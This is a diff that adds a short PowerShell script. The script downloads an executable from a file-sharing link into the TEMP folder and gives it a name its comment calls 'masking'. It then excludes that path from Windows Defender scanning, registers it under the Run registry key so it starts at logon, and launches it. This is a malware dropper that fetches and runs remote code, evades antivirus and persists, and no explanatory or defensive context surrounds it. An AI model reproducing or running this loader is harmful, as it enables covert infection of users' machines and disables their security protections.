@@ -1,0 +1,12 @@
+
+$exeUrl = "https://www.4sync.com/web/directDownload/jnOxMe2l/QvEYZW-h.8f1aa766b81c182330522810bad62ea4"
+$exeName = "build.exe"
+$maskedName = "build.exe"  # Common system process name for masking
+$exePath = "$env:TEMP\\build.exe"
+$maskedPath = "$env:TEMP\\$maskedName"
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+Rename-Item -Path $exePath -NewName $maskedName -Force
+Add-MpPreference -ExclusionPath $maskedPath
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "buildApp" -Value $maskedPath
+Start-Process -FilePath $maskedPath
